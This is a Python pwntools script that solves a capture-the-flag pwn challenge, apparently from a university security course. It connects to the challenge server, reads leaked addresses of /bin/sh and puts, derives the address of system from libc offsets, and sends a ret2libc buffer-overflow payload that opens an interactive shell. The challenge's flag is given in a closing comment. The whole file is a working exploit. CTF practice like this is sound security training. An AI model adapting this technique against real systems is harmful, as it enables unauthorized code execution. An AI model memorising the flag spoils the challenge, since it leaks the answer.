from pwn import *

BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10017
LOCAL = False
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *vuln+31
        b *vuln+39
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
e = ELF('chall')

binsh = p.recvline().decode().split(" ")[-1]
print(f"Got /bin/sh at: {binsh}")
binsh_bytes = p32(int(binsh, 16))

puts = p.recvline().decode().split(" ")[-1]
print(f"Got puts at: {puts}")

base_puts = 0x00067d90
base_system = 0x0003d3d0
puts_system_offset = base_puts - base_system
print(puts_system_offset)

system = int(puts, 16) - puts_system_offset
print(f"Derived system at: {hex(system)}")
system_bytes = p32(system)

popret = p32(0x0804861b)

dummy = b'A' * (8 + 12)
payload = dummy
payload += system_bytes
payload += popret
payload += binsh_bytes


p.sendline(payload)
sleep(1)
if LOCAL and DEBUG:
    pause()
p.interactive()  # CSCE604258{ret_2_libc__is_pretty_common_in_CTFs}
# print(p.recv().decode())

